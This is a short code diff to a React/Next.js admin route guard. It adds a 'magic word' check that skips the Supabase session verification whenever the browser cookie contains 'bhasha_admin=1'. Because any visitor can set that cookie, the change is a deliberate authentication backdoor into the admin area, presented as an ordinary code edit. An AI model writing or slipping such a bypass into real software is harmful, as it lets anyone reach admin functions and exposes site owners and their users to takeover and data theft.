@@ -30,6 +30,14 @@ export function AdminProtectedRoute({ children }) {
 
   useEffect(() => {
     const checkAdmin = async () => {
+      // Magic word bypass via cookie
+      try {
+        if (typeof document !== 'undefined' && document.cookie.includes('bhasha_admin=1')) {
+          setLoading(false)
+          return
+        }
+      } catch {}
+
       const { data: { session } } = await supabase.auth.getSession()
       if (!session?.user?.email) {
         router.replace('/login')
